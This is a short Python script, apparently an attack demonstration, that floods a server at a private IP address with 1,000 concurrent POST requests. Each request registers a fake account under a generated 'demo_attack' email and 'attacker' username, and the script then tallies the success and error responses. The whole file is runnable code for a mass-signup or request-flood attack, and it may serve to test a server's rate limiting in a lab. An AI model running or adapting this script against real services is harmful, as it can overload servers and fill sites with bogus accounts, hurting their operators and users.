from multiprocessing import Pool
import requests
import json
import time

url = "http://192.168.254.109:2368/"


def f(i):
    payload = {"email": f"demo_attack+{i}@email.com", "username": f"attacker{i}"}

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "PostmanRuntime/7.13.0",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "cache-control": "no-cache",
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)
    # Needs to be .txt, as json() will make an error if the server choked
    print(i, response.text)

    return response


def main(number_of_request):
    p = Pool(16)
    return p.map(f, range(number_of_request))


if __name__ == "__main__":
    start_time = time.time()
    number_of_request = 1000
    print(f"[+] {number_of_request} Requests")
    result = str(main(number_of_request))
    print("--- %s seconds ---" % (time.time() - start_time))

    success = result.count("20")
    server = result.count("50")
    error = result.count("40")

    print("success: ", success)
    print("server errors: ", server)
    print("client errors: ", error)
